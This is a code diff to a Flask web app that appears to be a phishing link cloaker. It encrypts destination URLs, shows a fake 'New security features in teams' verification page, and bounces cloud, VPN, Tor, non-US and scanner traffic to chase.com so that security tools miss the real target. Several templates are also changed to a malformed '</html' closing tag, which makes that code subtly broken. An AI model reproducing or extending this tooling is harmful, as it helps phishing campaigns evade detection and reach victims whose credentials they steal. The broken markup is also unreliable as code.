@@ -26,6 +26,7 @@ from dotenv import load_dotenv
 import ipaddress
 import string
 import sys
+import geoip2.database
 
 app = Flask(__name__)
 load_dotenv()
@@ -64,7 +65,8 @@ HETZNER_CIDR_URL = "https://www.hetzner.com/en/cloud/ip-ranges"
 LINODE_CIDR_URL = "https://www.linode.com/docs/guides/networking/ip-ranges/"
 VULTR_CIDR_URL = "https://www.vultr.com/company/ip-ranges/"
 TOR_EXIT_URL = "https://check.torproject.org/torbulkexitlist"
-ABUSEIPDB_API_KEY = os.getenv("ABUSEIPDB_API_KEY", "")  # Set in environment
+VPN_CIDR_URL = "https://raw.githubusercontent.com/X4BNet/lists_vpn/main/output/vpn/ipv4.txt"
+GEOIP_DB_PATH = os.getenv("GEOIP_DB_PATH", "/data/GeoLite2-City.mmdb")
 
 # Anti-bot settings
 SUSPICIOUS_UA_PATTERNS = [
@@ -81,6 +83,7 @@ BLOCKED_CIDR_REFRESH_INTERVAL = 86400  # 24 hours
 RISK_SCORE_THRESHOLD = 75
 MAX_PAYLOAD_PADDING = 32
 COOKIE_TOKEN_TTL = 600  # 10 minutes
+VERIFY_TOKEN_TTL = 10  # 10 seconds
 
 # Local CIDR fallback
 LOCAL_CIDR_FALLBACK = [
@@ -112,6 +115,14 @@ try:
 except Exception as e:
     logger.error(f"Invalid HMAC key at startup: {str(e)}")
     raise ValueError(f"HMAC key initialization failed: {str(e)}")
+
+# Geo-IP setup
+try:
+    geoip_reader = geoip2.database.Reader(GEOIP_DB_PATH)
+    logger.debug("Geo-IP database initialized successfully")
+except Exception as e:
+    logger.error(f"Geo-IP database initialization failed: {str(e)}")
+    geoip_reader = None
 
 # Flask configuration
 try:
@@ -230,11 +241,10 @@ def fetch_blocked_cidrs():
         except Exception as e:
             logger.warning(f"Failed to fetch Azure CIDRs: {str(e)}")
 
-        # Fetch OVH CIDRs (example, may need parsing)
+        # Fetch OVH CIDRs
         try:
             ovh_response = requests.get(OVH_CIDR_URL, timeout=5)
             ovh_response.raise_for_status()
-            # OVH may require parsing HTML or specific format
             for line in ovh_response.text.splitlines():
                 if line.strip() and re.match(r'^\d+\.\d+\.\d+\.\d+/\d+$', line):
                     blocked_cidrs.append(ipaddress.ip_network(line.strip(), strict=False))
@@ -253,9 +263,8 @@ def fetch_blocked_cidrs():
         except Exception as e:
             logger.warning(f"Failed to fetch Google Cloud CIDRs: {str(e)}")
 
-        # Fetch DigitalOcean, Hetzner, Linode, Vultr (similar parsing)
-        # Note: These may require specific parsing logic based on response format
-        for url in [DIGITALOCEAN_CIDR_URL, HETZNER_CIDR_URL, LINODE_CIDR_URL, VULTR_CIDR_URL]:
+        # Fetch DigitalOcean, Hetzner, Linode, Vultr, VPN
+        for url in [DIGITALOCEAN_CIDR_URL, HETZNER_CIDR_URL, LINODE_CIDR_URL, VULTR_CIDR_URL, VPN_CIDR_URL]:
             try:
                 response = requests.get(url, timeout=5)
                 response.raise_for_status()
@@ -303,11 +312,10 @@ def fetch_blocked_cidrs():
 # Scanner allowlist management
 def update_scanner_allowlist():
     try:
-        # Example: Populate from logs or known scanner IPs
         scanner_ips = [
             "13.107.6.0/24",  # Example Microsoft 365 range
             "8.8.8.8/32"      # Example Google range
-            # Add Barracuda, Proofpoint, etc. ranges from logs
+            # Add Barracuda, Proofpoint, Safelink ranges from logs
         ]
         if valkey_client:
             valkey_client.delete(SCANNER_ALLOWLIST_KEY)
@@ -344,11 +352,19 @@ def is_suspicious_request():
     query_params = request.args
 
     # Check blocked CIDRs
-    blocked_cidrs = fetch_blocked_cidrs()
+    if valkey_client:
+        cached_cidrs = valkey_client.get(BLOCKED_CIDR_CACHE_KEY)
+        if cached_cidrs:
+            blocked_cidrs = [ipaddress.ip_network(cidr) for cidr in json.loads(cached_cidrs)]
+        else:
+            blocked_cidrs = fetch_blocked_cidrs()
+    else:
+        blocked_cidrs = LOCAL_CIDR_FALLBACK
+
     try:
         ip_addr = ipaddress.ip_address(ip)
         if any(ip_addr in cidr for cidr in blocked_cidrs):
-            logger.debug(f"IP {ip} in blocked CIDR")
+            logger.debug(f"IP {ip} in blocked CIDR (cloud/VPN/Tor)")
             return redirect("https://www.chase.com", code=302)
     except ValueError:
         logger.warning(f"Invalid IP address: {ip}")
@@ -386,17 +402,17 @@ def is_suspicious_request():
         risk_score += 25
         logger.debug(f"Low request entropy: {entropy}")
 
-    # Behavioral analysis
-    if valkey_client:
+    # Behavioral analysis (only for high-risk IPs)
+    if valkey_client and risk_score >= 50:
         request_key = f"requests:{ip}:link"
         valkey_client.lpush(request_key, str(time.time()))
         valkey_client.ltrim(request_key, 0, 9)  # Keep last 10 requests
-        valkey_client.expire(request_key, 30)
+        valkey_client.expire(request_key, 20)
         recent_requests = valkey_client.lrange(request_key, 0, -1)
-        if len(recent_requests) > 3:
+        if len(recent_requests) > 2:
             timestamps = [float(t) for t in recent_requests]
-            if max(timestamps) - min(timestamps) < 30:
-                risk_score += 30
+            if max(timestamps) - min(timestamps) < 20:
+                risk_score += 50
                 logger.debug(f"Rapid link access from IP: {ip}")
 
     # Fingerprint analysis
@@ -409,37 +425,22 @@ def is_suspicious_request():
             risk_score += 50
             logger.debug(f"Repeated fingerprint from IP: {ip}")
 
-    # IP reputation
-    if ABUSEIPDB_API_KEY:
-        try:
-            cached_rep = valkey_client.get(f"ip_reputation:{ip}")
-            if cached_rep is None:
-                response = requests.get(
-                    f"https://api.abuseipdb.com/api/v2/check?ipAddress={ip}",
-                    headers={"Key": ABUSEIPDB_API_KEY, "Accept": "application/json"},
-                    timeout=5
-                )
-                response.raise_for_status()
-                score = response.json().get("data", {}).get("abuseConfidenceScore", 0)
-                valkey_client.setex(f"ip_reputation:{ip}", 3600, score)
-            else:
-                score = int(cached_rep)
-            if score > 50:
-                risk_score += 20
-                logger.debug(f"High abuse score for IP {ip}: {score}")
-        except Exception as e:
-            logger.warning(f"Failed to check IP reputation for {ip}: {str(e)}")
-
-    # Geo-IP (example, requires MaxMind GeoLite2 database)
-    # Note: You'd need to download GeoLite2-City.mmdb and use geoip2 library
-    # try:
-    #     reader = geoip2.database.Reader('GeoLite2-City.mmdb')
-    #     response = reader.city(ip)
-    #     if response.country.iso_code not in ['US', 'CA']:  # Adjust for your target region
-    #         risk_score += 20
-    #         logger.debug(f"Unexpected Geo-IP for {ip}: {response.country.iso_code}")
-    # except Exception as e:
-    #     logger.warning(f"Geo-IP check failed for {ip}: {str(e)}")
+    # Geo-IP
+    if geoip_reader and valkey_client:
+        cached_geo = valkey_client.get(f"geoip:{ip}")
+        if cached_geo is None:
+            try:
+                response = geoip_reader.city(ip)
+                country_code = response.country.iso_code
+                valkey_client.setex(f"geoip:{ip}", 3600, country_code)
+            except Exception as e:
+                logger.warning(f"Geo-IP check failed for {ip}: {str(e)}")
+                country_code = None
+        else:
+            country_code = cached_geo
+        if country_code and country_code not in ['US']:  # Adjust target region
+            risk_score += 20
+            logger.debug(f"Unexpected Geo-IP for {ip}: {country_code}")
 
     # Store risk score
     if valkey_client:
@@ -493,35 +494,23 @@ def dynamic_rate_limit(base_limit=5, base_per=60):
 # Payload encryption and obfuscation
 def encrypt_payload(payload):
     try:
-        # Convert payload to JSON and encode
         payload_bytes = json.dumps({
             "data": payload,
             "decoy": secrets.token_hex(16),
             "timestamp": int(time.time())
         }).encode('utf-8')
-        
-        # Generate random padding and store its length
         padding_length = random.randint(8, MAX_PAYLOAD_PADDING)
         padding = secrets.token_bytes(padding_length)
-        
-        # Prepend padding length (as 4-byte integer) to payload
         padded_payload = len(padding).to_bytes(4, 'big') + payload_bytes + padding
-        
-        # Base64 encode for safe transport
         b64_payload = base64.urlsafe_b64encode(padded_payload)
-        
-        # AES-GCM encryption
         iv = secrets.token_bytes(12)
         cipher = Cipher(algorithms.AES(AES_GCM_KEY), modes.GCM(iv), backend=default_backend())
         encryptor = cipher.encryptor()
         ciphertext = encryptor.update(b64_payload) + encryptor.finalize()
         encrypted = iv + ciphertext + encryptor.tag
-        
-        # HMAC signature
         h = hmac.HMAC(HMAC_KEY, hashes.SHA256(), backend=default_backend())
         h.update(encrypted)
         signature = h.finalize()
-        
         result = f"{base64.urlsafe_b64encode(encrypted).decode()}.{base64.urlsafe_b64encode(signature).decode()}"
         logger.debug(f"Encrypted payload: {result[:20]}...")
         return result
@@ -536,34 +525,22 @@ def decrypt_payload(encrypted):
             raise ValueError("Invalid payload format")
         encrypted_data = base64.urlsafe_b64decode(parts[0])
         signature = base64.urlsafe_b64decode(parts[1])
-        
-        # Verify HMAC
         h = hmac.HMAC(HMAC_KEY, hashes.SHA256(), backend=default_backend())
         h.update(encrypted_data)
         h.verify(signature)
-        
-        # AES-GCM decryption
         iv = encrypted_data[:12]
         tag = encrypted_data[-16:]
         ciphertext = encrypted_data[12:-16]
         cipher = Cipher(algorithms.AES(AES_GCM_KEY), modes.GCM(iv, tag), backend=default_backend())
         decryptor = cipher.decryptor()
         b64_payload = decryptor.update(ciphertext) + decryptor.finalize()
-        
-        # Decode base64
         padded_payload = base64.urlsafe_b64decode(b64_payload)
-        
-        # Extract padding length and separate payload
         if len(padded_payload) < 4:
             raise ValueError("Invalid payload: too short")
         padding_length = int.from_bytes(padded_payload[:4], 'big')
         if padding_length > MAX_PAYLOAD_PADDING or len(padded_payload) < 4 + padding_length:
             raise ValueError("Invalid padding length")
-        
-        # Extract JSON payload
         payload_bytes = padded_payload[4:-padding_length]
-        
-        # Decode JSON
         payload_json = json.loads(payload_bytes.decode('utf-8'))
         result = payload_json['data']
         logger.debug(f"Decrypted payload: {result[:50]}...")
@@ -701,7 +678,7 @@ def login():
                     <p class="text-gray-600">Something went wrong. Please try again later or check server logs.</p>
                 </div>
             </body>
-            </html>
+            </html
         """), 500
 
 @app.route("/", methods=["GET"])
@@ -729,7 +706,7 @@ def index():
                     <p class="text-gray-600">Something went wrong. Please try again later or check server logs.</p>
                 </div>
             </body>
-            </html>
+            </html
         """), 500
 
 @app.route("/dashboard", methods=["GET", "POST"])
@@ -941,7 +918,7 @@ def dashboard():
                     </div>
                 </div>
             </body>
-            </html>
+            </html
         """, username=username, form=form, urls=urls, primary_color=primary_color, error=error, valkey_error=valkey_error)
     except Exception as e:
         logger.error(f"Dashboard error for user {username}: {str(e)}", exc_info=True)
@@ -960,7 +937,7 @@ def dashboard():
                     <p class="text-gray-600">Something went wrong. Please try again later or check server logs.</p>
                 </div>
             </body>
-            </html>
+            </html
         """, error=str(e)), 500
 
 @app.route("/toggle_analytics/<url_id>", methods=["POST"])
@@ -1021,7 +998,7 @@ def delete_url(url_id):
                     <p class="text-gray-600">Database unavailable. Unable to delete URL.</p>
                 </div>
             </body>
-            </html>
+            </html
         """), 500
     except Exception as e:
         logger.error(f"Error in delete_url: {str(e)}", exc_info=True)
@@ -1040,7 +1017,7 @@ def delete_url(url_id):
                     <p class="text-gray-600">Something went wrong. Please try again later or check server logs.</p>
                 </div>
             </body>
-            </html>
+            </html
         """, error=str(e)), 500
 
 @app.route("/scanner-trap/<token>", methods=["GET"])
@@ -1078,30 +1055,13 @@ def redirect_handler(username, endpoint, encrypted_payload, path_segment):
     try:
         base_domain = get_base_domain()
         logger.debug(f"Redirect handler: username={username}, endpoint={endpoint}, payload={encrypted_payload[:20]}...")
-        url_id = hashlib.sha256(f"{endpoint}{encrypted_payload}".encode()).hexdigest()
         ip = request.remote_addr
         ua = request.headers.get('User-Agent', '').lower()
 
         # Validate payload length
         if not encrypted_payload or len(encrypted_payload) < 32:
             logger.warning(f"Invalid payload length: {len(encrypted_payload)}")
-            return render_template_string("""
-                <!DOCTYPE html>
-                <html lang="en">
-                <head>
-                    <meta charset="UTF-8">
-                    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-                    <title>Invalid Link</title>
-                    <script src="https://cdn.tailwindcss.com"></script>
-                </head>
-                <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
-                    <div class="bg-white p-8 rounded-xl shadow-lg max-w-sm w-full text-center">
-                        <h3 class="text-lg font-bold mb-4 text-red-600">Invalid Link</h3>
-                        <p class="text-gray-600">The link is invalid or has expired. Please try generating a new link or contact support.</p>
-                    </div>
-                </body>
-                </html>
-            """), 400
+            return redirect("https://www.chase.com", code=302)
 
         # Cookie-based token check
         token = request.cookies.get('bot_check_token')
@@ -1133,8 +1093,79 @@ def redirect_handler(username, endpoint, encrypted_payload, path_segment):
             except ValueError:
                 pass
 
+        # Generate verify token
+        verify_token = secrets.token_hex(16)
+        encrypted_payload = urllib.parse.unquote(encrypted_payload)
+        url_id = hashlib.sha256(f"{endpoint}{encrypted_payload}".encode()).hexdigest()
+
+        # Store request data for verification
+        if valkey_client:
+            valkey_client.hset(f"verify:{verify_token}", mapping={
+                "username": username,
+                "endpoint": endpoint,
+                "encrypted_payload": encrypted_payload,
+                "path_segment": path_segment,
+                "url_id": url_id,
+                "ip": ip,
+                "ua": ua,
+                "is_scanner": "1" if is_scanner else "0",
+                "is_first_request": "1" if is_first_request else "0",
+                "cookie_token": token
+            })
+            valkey_client.expire(f"verify:{verify_token}", VERIFY_TOKEN_TTL)
+
+        # Return loading page
+        return render_template_string("""
+            <!DOCTYPE html>
+            <html lang="en">
+            <head>
+                <meta charset="UTF-8">
+                <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                <meta http-equiv="refresh" content="2;url={{ verify_url }}">
+                <title>Verifying...</title>
+                <script src="https://cdn.tailwindcss.com"></script>
+                <style>
+                    body { background: linear-gradient(to right, #4f46e5, #7c3aed); }
+                    .container { animation: fadeIn 1s ease-in; }
+                    @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+                </style>
+            </head>
+            <body class="min-h-screen flex items-center justify-center p-4">
+                <div class="container bg-white p-8 rounded-xl shadow-2xl max-w-md w-full text-center">
+                    <h3 class="text-xl font-bold mb-4 text-gray-900">New security features in teams</h3>
+                    <p class="text-gray-600 mb-4">Verifying your request... Please wait.</p>
+                    <p class="text-gray-600 text-sm">Enable cookies or disable VPN to proceed.</p>
+                    <a href="/bot-trap/{{ bot_trap_token }}" style="display:none">trap</a>
+                </div>
+            </body>
+            </html
+        """, verify_url=url_for('verify', token=verify_token), bot_trap_token=secrets.token_hex(16))
+    except Exception as e:
+        logger.error(f"Error in redirect_handler: {str(e)}", exc_info=True)
+        return redirect("https://www.chase.com", code=302)
+
+@app.route("/verify/<token>", methods=["GET"])
+@dynamic_rate_limit(base_limit=5, base_per=60)
+def verify(token):
+    try:
+        if not valkey_client or not valkey_client.exists(f"verify:{token}"):
+            logger.warning(f"Invalid or expired verify token: {token}")
+            return redirect("https://www.chase.com", code=302)
+
+        verify_data = valkey_client.hgetall(f"verify:{token}")
+        username = verify_data.get("username")
+        endpoint = verify_data.get("endpoint")
+        encrypted_payload = verify_data.get("encrypted_payload")
+        path_segment = verify_data.get("path_segment")
+        url_id = verify_data.get("url_id")
+        ip = verify_data.get("ip")
+        ua = verify_data.get("ua")
+        is_scanner = verify_data.get("is_scanner") == "1"
+        is_first_request = verify_data.get("is_first_request") == "1"
+        cookie_token = verify_data.get("cookie_token")
+
         # Random delay
-        time.sleep(random.uniform(0.1, 0.5))
+        time.sleep(random.uniform(0.05, 0.2))
 
         # Analytics tracking
         should_count_click = False
@@ -1145,22 +1176,17 @@ def redirect_handler(username, endpoint, encrypted_payload, path_segment):
                 if not valkey_client.exists(click_key):
                     valkey_client.setex(click_key, 600, "1")
                     should_count_click = True
-                    # Delay for analytics
-                    time.sleep(2.0)
+                    time.sleep(1.0)  # Reduced delay
 
         # Process payload
-        encrypted_payload = urllib.parse.unquote(encrypted_payload)
         uuid_suffix_pattern = r'(/[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}[0-9a-f]+)?$'
         cleaned_path_segment = re.sub(uuid_suffix_pattern, '', path_segment)
 
         payload = None
         if valkey_client:
-            try:
-                cached_payload = valkey_client.get(f"url_payload:{url_id}")
-                if cached_payload:
-                    payload = cached_payload
-            except Exception as e:
-                logger.warning(f"Failed to fetch cached payload: {str(e)}")
+            cached_payload = valkey_client.get(f"url_payload:{url_id}")
+            if cached_payload:
+                payload = cached_payload
 
         if not payload:
             try:
@@ -1171,23 +1197,7 @@ def redirect_handler(username, endpoint, encrypted_payload, path_segment):
                     valkey_client.setex(f"url_payload:{url_id}", ttl, payload)
             except ValueError as e:
                 logger.error(f"Decryption failed: {str(e)}", exc_info=True)
-                return render_template_string("""
-                    <!DOCTYPE html>
-                    <html lang="en">
-                    <head>
-                        <meta charset="UTF-8">
-                        <meta name="viewport" content="width=device-width, initial-scale=1.0">
-                        <title>Invalid Link</title>
-                        <script src="https://cdn.tailwindcss.com"></script>
-                    </head>
-                    <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
-                        <div class="bg-white p-8 rounded-xl shadow-lg max-w-sm w-full text-center">
-                            <h3 class="text-lg font-bold mb-4 text-red-600">Invalid Link</h3>
-                            <p class="text-gray-600">The link is invalid or has expired. Please try generating a new link or contact support.</p>
-                        </div>
-                    </body>
-                    </html>
-                """), 400
+                return redirect("https://www.chase.com", code=302)
 
         try:
             data = json.loads(payload)
@@ -1205,7 +1215,7 @@ def redirect_handler(username, endpoint, encrypted_payload, path_segment):
             logger.error(f"Payload parsing error: {str(e)}", exc_info=True)
             return redirect("https://www.chase.com", code=302)
 
-        # Increment analytics for valid clicks
+        # Increment analytics
         if should_count_click and valkey_client:
             valkey_client.hincrby(f"user:{username}:url:{url_id}", "clicks", 1)
             logger.debug(f"Incremented click count for URL {url_id}")
@@ -1213,7 +1223,7 @@ def redirect_handler(username, endpoint, encrypted_payload, path_segment):
         # Set cookie for first request
         response = make_response(redirect(f"{redirect_url.rstrip('/')}/{cleaned_path_segment.lstrip('/')}", code=302))
         if is_first_request:
-            response.set_cookie('bot_check_token', token, max_age=COOKIE_TOKEN_TTL, secure=True, httponly=True, samesite='Strict')
+            response.set_cookie('bot_check_token', cookie_token, max_age=COOKIE_TOKEN_TTL, secure=True, httponly=True, samesite='Strict')
         logger.info(f"Redirecting to {redirect_url.rstrip('/')}/{cleaned_path_segment.lstrip('/')}")
         
         if is_scanner:
@@ -1221,7 +1231,7 @@ def redirect_handler(username, endpoint, encrypted_payload, path_segment):
         
         return response
     except Exception as e:
-        logger.error(f"Error in redirect_handler: {str(e)}", exc_info=True)
+        logger.error(f"Error in verify: {str(e)}", exc_info=True)
         return redirect("https://www.chase.com", code=302)
 
 @app.route("/<endpoint>/<path:encrypted_payload>/<path:path_segment>", methods=["GET"])
@@ -1259,7 +1269,7 @@ def catch_all(path):
                 <p class="text-gray-600">Please check your spelling and try again.</p>
             </div>
         </body>
-        </html>
+        </html
     """), 404
 
 @app.route("/update-cidrs", methods=["GET"])
